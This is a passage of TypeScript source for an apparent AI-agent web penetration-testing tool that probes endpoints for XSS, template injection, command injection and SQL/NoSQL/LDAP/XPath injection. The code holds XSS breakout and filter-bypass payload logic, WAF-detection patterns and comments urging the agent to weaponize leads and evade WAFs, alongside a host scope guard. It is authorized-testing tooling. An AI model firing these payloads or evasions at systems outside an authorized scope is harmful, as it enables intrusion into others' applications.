    // authorized-testing: accept self-signed on the (already in-scope) target host
    tls: { rejectUnauthorized: false },
  }
  if (r.method !== "GET" && r.method !== "HEAD") init.body = target.body
  const t0 = performance.now()
  try {
    const resp = await fetch(u.toString(), init as RequestInit)
    const text = (await resp.text()).slice(0, 200_000)
    return { status: resp.status, text, ms: Math.round(performance.now() - t0), headers: extractHeaders(resp.headers) }
  } catch (e: any) {
    const msg = String(e?.message ?? e)
    // a dropped/reset/timed-out connection is a common WAF response — flag it, don't treat as clean
    const timeout = /timeout|timed ?out|aborted|reset|ECONNRESET|ETIMEDOUT|socket|EOF|closed/i.test(msg)
    return { error: msg, timeout }
  }
}

// ── block detection: distinguish a WAF/challenge/rate-limit from a clean negative ──
// A "no leads" result must NOT be read as "endpoint is safe" when a WAF ate the payload.
const WAF_BODY = /cloudflare|attention required|just a moment|checking your browser|access denied|request unsuccessful|mod_?security|incapsula|sucuri|akamai|captcha|are you a robot|ddos protection/i
const WAF_SERVER = /cloudflare|sucuri|akamai|incapsula|mod_?security|awselb|barracuda|f5|big-?ip/i
function looksBlocked(status: number): boolean {
  return status === 403 || status === 406 || status === 429 || status === 503
}
// Returns a short reason string when the response looks WAF/challenge-shaped, else undefined.
function blockSignal(res: SendOk): string | undefined {
  if (looksBlocked(res.status)) return `HTTP ${res.status}`
  const server = res.headers["server"] ?? ""
  if (res.headers["cf-ray"] || res.headers["x-sucuri-id"] || WAF_SERVER.test(server)) {
    if (WAF_BODY.test(res.text.slice(0, 4000))) return `WAF challenge (${server || "cdn header"})`
  }
  if (WAF_BODY.test(res.text.slice(0, 2000))) return "WAF/challenge page"
  return undefined
}

// Bounded evidence excerpt: ~radius chars of context around a match, whitespace-collapsed,
// so the agent SEES the real signal (error text / evaluated value / command output) without
// the tool dumping the whole body (context discipline). Capped hard at 320 chars.
function excerptAround(text: string, index: number, matchLen: number, radius = 90): string {
  const start = Math.max(0, index - radius)
  const end = Math.min(text.length, index + matchLen + radius)
  const body = text.slice(start, end).replace(/\s+/g, " ").trim().slice(0, 320)
  return (start > 0 ? "…" : "") + body + (end < text.length ? "…" : "")
}
function excerptOf(text: string, needle: string, radius = 90): string {
  const i = text.indexOf(needle)
  return i < 0 ? "" : excerptAround(text, i, needle.length, radius)
}

// Repeat the benign baseline a few times to measure the page's NATURAL jitter (bytes + latency)
// — so a boolean-differential must exceed real noise, not a timestamp/CSRF-token/ad wobble.
type Baseline =
  | { ok: true; status: number; bytes: number; ms: number; byteJitter: number; marker: string; text: string; headers: Record<string, string> }
  | { ok: false; block?: string; error?: string; timeout?: boolean }
async function repeatBaseline(r: ResolvedRequest, point: InjPoint, abort: AbortSignal, budget: SendBudget, times = 2): Promise<Baseline> {
  let first: SendOk | undefined
  let minB = Infinity
  let maxB = -Infinity
  let maxMs = 0
  let marker = ""
  for (let i = 0; i < times; i++) {
    if (abort.aborted || budget.sent >= budget.max) break
    const n = nonce()
    const res = await send(r, applyPayload(r, point, n), abort, budget)
    if ("error" in res) return { ok: false, error: res.error, timeout: res.timeout }
    const blk = blockSignal(res)
    if (blk) return { ok: false, block: blk }
    if (!first) {
      first = res
      marker = n
    }
    minB = Math.min(minB, res.text.length)
    maxB = Math.max(maxB, res.text.length)
    maxMs = Math.max(maxMs, res.ms)
  }
  if (!first) return { ok: false, error: "no baseline sample (budget/abort)" }
  return { ok: true, status: first.status, bytes: first.text.length, ms: maxMs, byteJitter: maxB - minB, marker, text: first.text, headers: first.headers }
}

// classify WHERE the marker landed so the agent knows how to break out (attribute vs JS vs body)
function classifyXssContext(text: string, marker: string): string {
  const i = text.indexOf(marker)
  if (i < 0) return "unknown"
  const before = text.slice(Math.max(0, i - 80), i)
  if (/<script\b[^>]*>(?:(?!<\/script>)[\s\S])*$/i.test(before)) return "javascript"
  // RCDATA / escapable-raw-text: <svg> etc. do NOT parse here — you must CLOSE the host element first
  if (/<textarea\b[^>]*>(?:(?!<\/textarea>)[\s\S])*$/i.test(before)) return "rcdata-textarea"
  if (/<title\b[^>]*>(?:(?!<\/title>)[\s\S])*$/i.test(before)) return "rcdata-title"
  if (/<style\b[^>]*>(?:(?!<\/style>)[\s\S])*$/i.test(before)) return "rcdata-style"
  if (/=\s*"[^"]*$/.test(before)) return "attribute-double-quote"
  if (/=\s*'[^']*$/.test(before)) return "attribute-single-quote"
  if (/<[a-z][^>]*$/i.test(before)) return "tag-name"
  return "html-body"
}
const XSS_BREAKOUT: Record<string, (n: string) => string> = {
  "attribute-double-quote": (n) => `"><svg data-p=${n}>`,
  "attribute-single-quote": (n) => `'><svg data-p=${n}>`,
  javascript: (n) => `</script><svg data-p=${n}>`,
  "rcdata-textarea": (n) => `</textarea><svg data-p=${n}>`,
  "rcdata-title": (n) => `</title><svg data-p=${n}>`,
  "rcdata-style": (n) => `</style><svg data-p=${n}>`,
}

interface PointObservation {
  point: string
  marker_reflected: boolean
  marker_html_encoded: boolean | null
  reflection_snippet?: string // excerpt of the response around the reflected marker (shows the sink context)
  context?: string // html-body | attribute-* | javascript | tag-name — how to weaponize
  surviving_tags: string[] // tags that reflected RAW (un-stripped, un-encoded) — a fact, not a verdict
  weaponized: string[] // full handler payloads (incl. alert/confirm-blacklist bypasses) that reflected RAW — ready leads
  breakout?: string // a context-breakout sequence ("><svg…, '><svg…, </script>…) that reflected RAW
  block_signal?: string
  blocked: boolean
  note?: string
}

async function probeXssPoint(
  r: ResolvedRequest,
  point: InjPoint,
  abort: AbortSignal,
  delayMs: number,
  budget: SendBudget,
): Promise<PointObservation> {
  const obs: PointObservation = {
    point: `${point.location}:${point.name}`,
    marker_reflected: false,
    marker_html_encoded: null,
    surviving_tags: [],
    weaponized: [],
    blocked: false,
  }
  const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
  const n = nonce()
  // 1) benign marker — is this param reflected at all, and encoded?
  const m = await send(r, applyPayload(r, point,n), abort, budget)
  if ("error" in m) {
    obs.note = `send failed: ${m.error}`
    return obs
  }
  const bblk = blockSignal(m)
  if (bblk) {
    obs.blocked = true
    obs.block_signal = bblk
    obs.note = `baseline ${bblk} — NOT evidence of safety`
    return obs
  }
  obs.marker_reflected = m.text.includes(n)
  if (!obs.marker_reflected) return obs // not reflected here — nothing to enumerate
  obs.reflection_snippet = excerptOf(m.text, n) // show the sink context so the agent picks the right handler
  obs.context = classifyXssContext(m.text, n) // attribute / javascript / html-body → how to break out

  // 2) tag battery — which tags survive a filter (reflect RAW), one send per tag
  for (const tag of XSS_TAGS) {
    if (abort.aborted || budget.sent >= budget.max) break
    const tn = nonce()
    // Slash separator (valid HTML: `<svg/data-p=…>` parses identically to a space) so the probe
    // survives filters that STRIP whitespace — a space would fuse `<svgdata-p=…>` and defeat the
    // `<tag\b…` survival regex. Equivalent to a space on normal targets; the survival check is unchanged.
    const res = await send(r, applyPayload(r, point,`<${tag}/data-p=${tn}>`), abort, budget)
    if ("error" in res) continue
    if (looksBlocked(res.status)) {
      obs.blocked = true
      continue
    }
    // FACT: does `<tag ... tn` appear raw (tag survived), vs `&lt;tag` (encoded), vs tn alone (stripped)?
    const rawTag = new RegExp(`<${tag}\\b[^>]*${tn}`, "i").test(res.text)
    const encoded = res.text.includes(`&lt;${tag}`) || res.text.includes(`&lt;${tag.toUpperCase()}`)
    if (rawTag) obs.surviving_tags.push(tag)
    if (obs.marker_html_encoded === null) obs.marker_html_encoded = encoded && !rawTag
    await sleep(delayMs)
  }
  // 3) context-breakout probe: if the marker is in an attribute or a <script> block, does the
  //    quote/`</script>` escape reflect RAW? (attribute/JS XSS lives here, not in body tag-survival)
  const mk = obs.context && XSS_BREAKOUT[obs.context]
  if (mk && !abort.aborted && budget.sent < budget.max) {
    const tn = nonce()
    const res = await send(r, applyPayload(r, point, mk(tn)), abort, budget)
    if (!("error" in res) && !looksBlocked(res.status) && new RegExp(`<svg\\b[^>]*${tn}`, "i").test(res.text)) obs.breakout = mk(tn)
  }
  // 4) weaponized + filter-bypass battery — only if a tag already survived (weaponization plausible).
  //    Reports which FULL handler payload (incl. alert/confirm-blocklist bypasses) reflects RAW, so a
  //    weak model gets a ready-to-fire payload instead of guessing the evasion itself.
  if (obs.surviving_tags.length > 0) {
    for (const make of XSS_WEAPONS) {
      if (abort.aborted || budget.sent >= budget.max) break
      const wn = nonce()
      const { payload, sig } = make(wn)
      const res = await send(r, applyPayload(r, point, payload), abort, budget)
      if ("error" in res || looksBlocked(res.status)) continue
      if (sig.test(res.text)) {
        // Emit BOTH quote styles so a quote-blocklist can't strand the lead: e.g. a filter that
        // bans the single quote ' leaves alert("XSS") as the only firing form. Double-quote first
        // (marginally rarer in blocklists); the model fires the first that survives its filter.
        obs.weaponized.push(payload.replace(wn, '"XSS"'))
        obs.weaponized.push(payload.replace(wn, "'XSS'"))
      }
      await sleep(delayMs)
    }
  }
  return obs
}

// ── SSTI observation: was a template expression EVALUATED server-side? (facts about bytes) ──

interface SstiObservation {
  point: string
  marker_reflected: boolean
  block_signal?: string
  baseline: { status: number; bytes: number; ms: number }
  // engine syntaxes whose arithmetic was EVALUATED (product present, literal absent) — each WITH
  // an excerpt of the response showing the computed product in context. A fact, not a verdict.
  evaluated: { syntax: string; snippet: string }[]
  blocked: boolean
  note?: string
}

async function probeSstiPoint(
  r: ResolvedRequest,
  point: InjPoint,
  abort: AbortSignal,
  delayMs: number,
  budget: SendBudget,
): Promise<SstiObservation> {
  const obs: SstiObservation = {
    point: `${point.location}:${point.name}`,
    marker_reflected: false,
    baseline: { status: 0, bytes: 0, ms: 0 },
    evaluated: [],
    blocked: false,
  }
  const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
  const n = nonce()
  const m = await send(r, applyPayload(r, point,n), abort, budget)
  if ("error" in m) {
    obs.note = `send failed: ${m.error}`
    return obs
  }
  const bsig = blockSignal(m)
  if (bsig) {
    obs.blocked = true
    obs.block_signal = bsig
    obs.note = `baseline ${bsig} — NOT evidence of safety`
    return obs
  }
  obs.marker_reflected = m.text.includes(n)
  obs.baseline = { status: m.status, bytes: m.text.length, ms: m.ms }
  // Fire each engine syntax. FACT = product present AND literal absent ⇒ evaluated server-side.
  for (const s of SSTI_SYNTAXES) {
    if (abort.aborted || budget.sent >= budget.max) break
    const res = await send(r, applyPayload(r, point,s.wrap(SSTI_EXPR)), abort, budget)
    if ("error" in res) continue
    if (looksBlocked(res.status)) {
      obs.blocked = true
      continue
    }
    if (res.text.includes(SSTI_PRODUCT) && !res.text.includes(SSTI_EXPR))
      obs.evaluated.push({ syntax: s.name, snippet: excerptOf(res.text, SSTI_PRODUCT) })
    await sleep(delayMs)
  }
  return obs
}

// ── Command-injection observation: did a benign read-only probe produce command output? ──

interface CmdObservation {
  point: string
  marker_reflected: boolean
  block_signal?: string
  baseline: { status: number; bytes: number; ms: number }
  // separators whose read-only command produced OUTPUT, each WITH an excerpt of the response
  // showing that output (e.g. the uid= line). A fact, not a verdict.
  command_output: { separator: string; cmd: string; snippet: string }[]
  blocked: boolean
  note?: string
}

async function probeCmdPoint(
  r: ResolvedRequest,
  point: InjPoint,
  abort: AbortSignal,
  delayMs: number,
  budget: SendBudget,
): Promise<CmdObservation> {
  const obs: CmdObservation = {
    point: `${point.location}:${point.name}`,
    marker_reflected: false,
    baseline: { status: 0, bytes: 0, ms: 0 },
    command_output: [],
    blocked: false,
  }
  const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
  const n = nonce()
  const m = await send(r, applyPayload(r, point,n), abort, budget)
  if ("error" in m) {
    obs.note = `send failed: ${m.error}`
    return obs
  }
  const bsig = blockSignal(m)
  if (bsig) {
    obs.blocked = true
    obs.block_signal = bsig
    obs.note = `baseline ${bsig} — NOT evidence of safety`
    return obs
  }
  obs.marker_reflected = m.text.includes(n)
  obs.baseline = { status: m.status, bytes: m.text.length, ms: m.ms }
  // Try each read-only probe across every separator. Once one probe's OS confirms, skip the
  // other OS (keeps the common Unix case to ~6 sends, not 12).
  for (const probe of CMD_PROBES) {
    let found = false
    for (const sep of CMD_SEPARATORS) {
      if (abort.aborted || budget.sent >= budget.max) break
      const res = await send(r, applyPayload(r, point,sep.wrap(probe.cmd)), abort, budget)
      if ("error" in res) continue
      if (looksBlocked(res.status)) {
        obs.blocked = true
        continue
      }
      const mm = probe.marker.exec(res.text)
      if (mm) {
        obs.command_output.push({ separator: sep.name, cmd: probe.cmd, snippet: excerptAround(res.text, mm.index, mm[0].length) })
        found = true
      }
      await sleep(delayMs)
    }
    if (found) break
  }
  return obs
}

const ERRSIG_NOT_TESTED = [
  "blind injection with no error text AND no response differential (needs the agent's timing/OOB techniques)",
  "exploitation — data extraction, UNION, OR-based/stacked/auth-bypass payloads (the AGENT does this; the probe never widens a query)",
  "second-order/stored injection (fires on a later request)",
]
const TESTED_LABEL: Record<string, string> = {
  xss: "xss: reflected tag-survival",
  ssti: "ssti: arithmetic evaluation",
  cmd: "cmd: read-only id/ver command-output",
  sqli: "sqli: error-signature + AND-based boolean-differential",
  nosql: "nosql: error-signature",
  ldap: "ldap: error-signature",
  xpath: "xpath: error-signature",
}
const NOT_TESTED_BY_CLASS: Record<string, string[]> = {
  xss: XSS_NOT_TESTED,
  ssti: SSTI_NOT_TESTED,
  cmd: CMD_NOT_TESTED,
  sqli: ERRSIG_NOT_TESTED,
  nosql: ERRSIG_NOT_TESTED,
  ldap: ERRSIG_NOT_TESTED,
  xpath: ERRSIG_NOT_TESTED,
}

// ── error-signature observation (sqli/nosql/ldap/xpath): facts about which payloads broke ──

interface ErrSigObservation {
  point: string
  class: string
  baseline: { status: number; bytes: number; ms: number; byte_jitter: number } // fingerprint + measured noise floor
  block_signal?: string // WAF/challenge/timeout shadowed this probe → a "no findings" result is NOT "safe"
  // payloads that tripped this class's error signature — WITH fingerprint, latency, engine hint + excerpt.
  error_findings: { payload: string; status: number; bytes: number; ms: number; server?: string; snippet: string }[]
  // AND-based boolean-differential with RAW base/true/false status+bytes+latency+Location+Set-Cookie so
  // YOU judge the shape (true≈base & false≠base ⇒ classic boolean SQLi; a Location/Set-Cookie flip ⇒ auth
  // bypass). `signals` lists which axes differed above the measured noise floor.
  bool_findings: {
    pair: string
    base_bytes: number
    true: { status: number; bytes: number; ms: number; location?: string; set_cookie: boolean }
    false: { status: number; bytes: number; ms: number; location?: string; set_cookie: boolean }
    differential: boolean
    signals: string[]
  }[]
  blocked: boolean
  note?: string
}

async function probeErrorSigPoint(
  r: ResolvedRequest,
  point: InjPoint,
  cls: "sqli" | "nosql" | "ldap" | "xpath",
  abort: AbortSignal,
  delayMs: number,
  budget: SendBudget,
): Promise<ErrSigObservation> {
  const spec = ERRSIG[cls]
  const obs: ErrSigObservation = {
    point: `${point.location}:${point.name}`,
    class: cls,
    baseline: { status: 0, bytes: 0, ms: 0, byte_jitter: 0 },
    error_findings: [],
    bool_findings: [],
    blocked: false,
  }
  const sleep = (ms: number) => (ms ? new Promise((res) => setTimeout(res, ms)) : Promise.resolve())
  // repeat baseline → status/bytes/latency + a measured byte-jitter noise floor
  const bl = await repeatBaseline(r, point, abort, budget)
  if (!bl.ok) {
    obs.blocked = !!bl.block
    obs.block_signal = bl.block
    obs.note = bl.block
      ? `baseline blocked: ${bl.block} — NOT evidence of safety`
      : `baseline failed: ${bl.error}${bl.timeout ? " (timeout/reset — possible WAF drop, NOT safety)" : ""}`
    if (bl.timeout) obs.block_signal = "timeout/reset (possible WAF)"
    return obs
  }
  obs.baseline = { status: bl.status, bytes: bl.bytes, ms: bl.ms, byte_jitter: bl.byteJitter }
  const floor = Math.max(16, bl.byteJitter + 8) // a real differential must beat measured page noise
  // 1) error-signature battery — pure syntax-breakers (cannot widen: a broken query only errors)
  for (const p of spec.payloads) {
    if (abort.aborted || budget.sent >= budget.max) break
    const res = await send(r, applyPayload(r, point, p), abort, budget)
    if ("error" in res) {
      if (res.timeout && !obs.block_signal) obs.block_signal = "timeout/reset (possible WAF)"
      continue
    }
    const blk = blockSignal(res)
    if (blk) {
      obs.blocked = true
      obs.block_signal ??= blk
      continue
    }
    const m = spec.signatures.exec(res.text)
    if (m)
      obs.error_findings.push({
        payload: p,
        status: res.status,
        bytes: res.text.length,
        ms: res.ms,
        server: res.headers["server"] ?? res.headers["x-powered-by"],
        snippet: excerptAround(res.text, m.index, m[0].length),
      })
    await sleep(delayMs)
  }
  // 2) AND-based boolean-differential (SAFE: AND narrows/no-ops — it can never widen a write)
  for (const pair of spec.boolPairs ?? []) {
    if (abort.aborted || budget.sent >= budget.max) break
    const t = await send(r, applyPayload(r, point, pair.t), abort, budget)
    const fr = await send(r, applyPayload(r, point, pair.f), abort, budget)
    if ("error" in t || "error" in fr) continue
    // a WAF/rate-limit on either half manufactures a phantom differential — exclude it, don't flag
    if (blockSignal(t) || blockSignal(fr)) {
      obs.block_signal ??= "boolean pair blocked (WAF/rate-limit) — differential unreliable"
      continue
    }
    const near = (a: number, b: number) => Math.abs(a - b) <= floor
    const signals: string[] = []
    if (Math.abs(t.text.length - fr.text.length) > floor) signals.push("bytes")
    if (t.status !== fr.status) signals.push("status")
    if ((t.headers["location"] ?? "") !== (fr.headers["location"] ?? "")) signals.push("location")
    if (!!t.headers["set-cookie"] !== !!fr.headers["set-cookie"]) signals.push("set-cookie")
    if (near(t.text.length, bl.bytes) && !near(fr.text.length, bl.bytes)) signals.push("true≈base,false≠base")
    obs.bool_findings.push({
      pair: `${pair.t}  vs  ${pair.f}`,
      base_bytes: bl.bytes,
      true: { status: t.status, bytes: t.text.length, ms: t.ms, location: t.headers["location"], set_cookie: !!t.headers["set-cookie"] },
      false: { status: fr.status, bytes: fr.text.length, ms: fr.ms, location: fr.headers["location"], set_cookie: !!fr.headers["set-cookie"] },
      differential: signals.length > 0,
      signals,
    })
    await sleep(delayMs)
  }
  // 3) NoSQL OPERATOR-injection differential (query/form/json only). true = an operator that matches
  //    EVERY document ($ne/$regex-all/$gt), false = one that matches none — the byte differential is
  //    the canonical NoSQLi oracle (crash-breakers above only catch the parse-error case).
  if (cls === "nosql") {
    const opPairs: { t: [string, any]; f: [string, any] }[] = [
      { t: ["$ne", "zzNoMatch"], f: ["$eq", "zzNoMatch"] }, // != nomatch (all) vs == nomatch (none)
      { t: ["$regex", ".*"], f: ["$regex", "^zzNoMatch$"] }, // matches all vs matches none
      { t: ["$gt", ""], f: ["$lt", ""] }, // > "" (all strings) vs < "" (none)
    ]
    for (const op of opPairs) {
      if (abort.aborted || budget.sent >= budget.max) break
      const tTgt = applyOperatorTarget(r, point, op.t[0], op.t[1])
      const fTgt = applyOperatorTarget(r, point, op.f[0], op.f[1])
      if (!tTgt || !fTgt) break // location can't carry an operator (header/cookie/path)
      const t = await send(r, tTgt, abort, budget)
      const fr = await send(r, fTgt, abort, budget)
      if ("error" in t || "error" in fr) continue
      if (blockSignal(t) || blockSignal(fr)) {
        obs.block_signal ??= "operator pair blocked (WAF/rate-limit) — differential unreliable"
        continue
      }
      const signals: string[] = []
      if (Math.abs(t.text.length - fr.text.length) > floor) signals.push("bytes")
      if (t.status !== fr.status) signals.push("status")
      if (!!t.headers["set-cookie"] !== !!fr.headers["set-cookie"]) signals.push("set-cookie")
      obs.bool_findings.push({
        pair: `${point.name}[${op.t[0]}]=${op.t[1]}  vs  ${point.name}[${op.f[0]}]=${op.f[1]}`,
        base_bytes: bl.bytes,
        true: { status: t.status, bytes: t.text.length, ms: t.ms, location: t.headers["location"], set_cookie: !!t.headers["set-cookie"] },
        false: { status: fr.status, bytes: fr.text.length, ms: fr.ms, location: fr.headers["location"], set_cookie: !!fr.headers["set-cookie"] },
        differential: signals.length > 0,
        signals,
      })
      await sleep(delayMs)
    }
  }
  return obs
}

export const InjectProbeTool = Tool.define("inject_probe", {
  description,
  parameters: z.object({
    request_id: z.string().optional().describe("ID of a captured request to probe (PREFERRED — resolves URL, headers, body, credential)."),
    target: z
      .object({
        method: z.enum(["GET", "POST", "PUT", "PATCH", "DELETE"]).default("GET"),
        url: z.string().describe("Absolute URL including query string, e.g. http://host/page?name=x"),
        headers: z.record(z.string(), z.string()).optional(),
        body: z.string().optional(),
        content_type: z.string().optional(),
      })
      .optional()
      .describe("Fallback when the target is NOT a stored request (a new/unseen endpoint). Provide EITHER request_id OR target."),
    vuln_type: z
      .array(z.enum(["xss", "ssti", "cmd", "sqli", "nosql", "ldap", "xpath"]))
      .min(1)
      .describe(
        "Injection classes to probe — YOU pick the set that fits THIS endpoint (don't run every class everywhere; e.g. no xpath on a plain REST/JSON API). xss/ssti/cmd return execution-facts; sqli/nosql/ldap/xpath return error-signature (sqli also a safe AND-based boolean-differential) facts. The tool never exploits — it hands you leads.",
      ),
    points: z
      .array(
        z.object({
          location: z.enum(["query", "form_field", "json_body", "header", "cookie", "path"]),
          name: z
            .string()
            .describe("query/form param name · JSON field path (a.b.c) · header name · cookie name · 0-based path-segment index"),
        }),
      )
      .optional()
      .describe("WHERE to inject — YOU choose the points. Omit to auto-enumerate query + form-urlencoded params."),
    target_param: z
      .string()
      .optional()
      .describe("Convenience filter for the auto-enumerate path (probe only this query/form param). Ignored when `points` is given."),
  }),
  async execute(params, ctx) {
    let resolved: ResolvedRequest | { error: string }
    if (params.request_id) {
      const sessionID = Session.root(ctx.sessionID)
      const request = Request.get(sessionID).find((r) => r.id === params.request_id)
      if (!request) {
        return { title: "inject_probe", output: `Request "${params.request_id}" not found.`, metadata: {} }
      }
      resolved = resolve(request)
    } else if (params.target) {
      // Scope guard for the direct-target path: a caller-supplied URL must point at a
      // host the crawl ALREADY captured (the session's in-scope allowlist). This closes
      // the SSRF-shaped hole where a model could aim probes at an arbitrary host. An
      // empty allowlist (no captured requests) is refused, not waved through.
      const sessionID = Session.root(ctx.sessionID)
      const allowedHosts = new Set(Request.get(sessionID).map((r) => r.host).filter(Boolean))
      let targetHost = ""
      try {
        targetHost = new URL(params.target.url).hostname
      } catch {}
      if (!targetHost || allowedHosts.size === 0 || !allowedHosts.has(targetHost)) {
        return {
          title: "inject_probe — refused (out of scope)",
          output: `Refusing target host "${targetHost || params.target.url}": not among this session's in-scope hosts [${[...allowedHosts].join(", ") || "none captured"}]. inject_probe only reaches hosts the crawl already captured.`,
          metadata: {},
        }
      }
      resolved = resolveFromTarget(params.target)
    } else {
      return {
        title: "inject_probe",
        output: "Provide either request_id (a stored request) or target (a direct {method,url} spec).",
        metadata: {},
      }
    }
    if ("error" in resolved) {
      return { title: "inject_probe", output: `Could not resolve request: ${resolved.error}`, metadata: {} }
    }
    const DELAY = 120
    const budget: SendBudget = { sent: 0, max: 120 } // hard upper bound on total sends per call

    const targetInfo = {
      method: resolved.method,
      url: resolved.url.toString(),
      auth: resolved.auth,
      provenance: resolved.provenance,
    }

    // WHERE: agent-chosen points (validated), else auto-enumerate query + form params.
    let points: InjPoint[]
    let rejected: { point: string; reason: string }[] = []
    if (params.points && params.points.length > 0) {
      const v = validatePoints(params.points as InjPoint[])
      points = v.points
      rejected = v.rejected
    } else {
      points = enumeratePoints(resolved, params.target_param)
    }

    if (points.length === 0) {
      return {
        title: "inject_probe",
        output: JSON.stringify(
          {
            note: "No injection points to probe (no query/form params auto-found and no explicit `points` given). Pass `points` (json_body/header/cookie/path/…) to target other locations. This tool did NOT test any injection point.",
            target: targetInfo,
            rejected_points: rejected.length ? rejected : undefined,
          },
          null,
          2,
        ),
        metadata: {},
      }
    }

    // Probe each SELECTED class at each SELECTED point, capped by the shared send budget.
    const results: { class: string; observations: unknown[] }[] = []
    const leads: string[] = []
    const testedLabels: string[] = []
    const notTested = new Set<string>()
    const blockSignals = new Set<string>() // WAF/challenge/timeout hits — qualify any "no leads" result
    const markBlocked = (o: { point: string; blocked?: boolean; block_signal?: string }, cls: string) => {
      if (o.block_signal) blockSignals.add(`${cls} @ ${o.point}: ${o.block_signal}`)
      else if (o.blocked) blockSignals.add(`${cls} @ ${o.point}: blocked (WAF/rate-limit)`)
    }
    for (const cls of params.vuln_type) {
      const classObs: unknown[] = []
      for (const point of points) {
        if (ctx.abort.aborted || budget.sent >= budget.max) break
        if (cls === "xss") {
          const o = await probeXssPoint(resolved, point, ctx.abort, DELAY, budget)
          classObs.push(o)
          markBlocked(o, cls)
          if (o.weaponized.length > 0)
            leads.push(`xss @ ${o.point}: READY payload(s) reflected un-encoded (copy & fire, filter-bypass already applied): ${o.weaponized.slice(0, 4).join("  |  ")} — confirm execution.`)
          else if (o.surviving_tags.length > 0)
            leads.push(`xss @ ${o.point}: tag(s) [${o.surviving_tags.join(", ")}] reflected un-encoded${o.context ? ` in ${o.context} context` : ""} — weaponize one (event handler) and confirm.`)
        } else if (cls === "ssti") {
          const o = await probeSstiPoint(resolved, point, ctx.abort, DELAY, budget)
          classObs.push(o)
          markBlocked(o, cls)
          if (o.evaluated.length > 0)
            leads.push(`ssti @ ${o.point}: syntax [${o.evaluated.map((e) => e.syntax).join(", ")}] evaluated ${SSTI_EXPR}→${SSTI_PRODUCT} server-side (snippet in evaluated) — confirm engine + weaponize.`)
        } else if (cls === "cmd") {
          const o = await probeCmdPoint(resolved, point, ctx.abort, DELAY, budget)
          classObs.push(o)
          markBlocked(o, cls)
          if (o.command_output.length > 0)
            leads.push(`cmd @ ${o.point}: separator(s) [${o.command_output.map((c) => c.separator).join(", ")}] returned command output (snippet in command_output) — confirm + enumerate.`)
        } else {
          const o = await probeErrorSigPoint(resolved, point, cls, ctx.abort, DELAY, budget)
          classObs.push(o)
          markBlocked(o, cls)
          if (o.error_findings.length > 0)
            leads.push(`${cls} @ ${o.point}: payload(s) [${o.error_findings.map((e) => e.payload).join(" ")}] tripped a ${cls} error signature (snippet in error_findings) — investigate (exploitation is YOURS).`)
          const diffs = o.bool_findings.filter((b) => b.differential)
          if (diffs.length > 0)
            leads.push(`${cls} @ ${o.point}: boolean-differential on [${diffs.map((b) => `${b.pair} {${b.signals.join(",")}}`).join(" ; ")}] (baseline=${o.baseline.bytes}B±${o.baseline.byte_jitter}; true/false detail in bool_findings) — boolean-injection lead; verify.`)
        }
      }
      results.push({ class: cls, observations: classObs })
      testedLabels.push(TESTED_LABEL[cls])
      for (const n of NOT_TESTED_BY_CLASS[cls]) notTested.add(n)
    }

    const truncated = budget.sent >= budget.max
    if (truncated)
      notTested.add(`send cap (${budget.max}) reached — some class×point combinations were NOT probed; narrow points/vuln_type and re-run.`)

    const blocked = [...blockSignals]
    const evidence = {
      note:
        "OBSERVATIONS ONLY — inject_probe does NOT confirm vulnerabilities and never exploits. Every entry is a LEAD you must verify yourself, never a verdict. Exploitation — UNION, OR-bypass, auth-bypass, blind extraction, weaponization — is YOUR job, not the probe's." +
        (leads.length === 0 && blocked.length > 0
          ? " ⚠️ NO LEADS but payloads were WAF/challenge-BLOCKED at some points — this is NOT evidence the endpoint is safe; the app was shielded. Escalate with encoding/evasion (agent-side) or a different vantage."
          : ""),
      target: targetInfo,
      probed: `classes [${params.vuln_type.join(", ")}] × ${points.length} point(s)`,
      results,
      verification_required: true,
      leads,
      block_signals: blocked.length ? blocked : undefined,
      coverage: { tested: testedLabels, not_tested: [...notTested] },
      sends: { used: budget.sent, cap: budget.max, truncated },
      rejected_points: rejected.length ? rejected : undefined,
      aborted: ctx.abort.aborted || undefined,
    }
    const title = leads.length
      ? `inject_probe: ${leads.length} lead(s) across [${params.vuln_type.join(",")}] (verify)`
      : blocked.length
        ? `inject_probe: no leads but ${blocked.length} WAF-block(s) — NOT proof of safety`
        : `inject_probe: no leads across [${params.vuln_type.join(",")}]`
    return { title, output: JSON.stringify(evidence, null, 2), metadata: {} }
  },
})
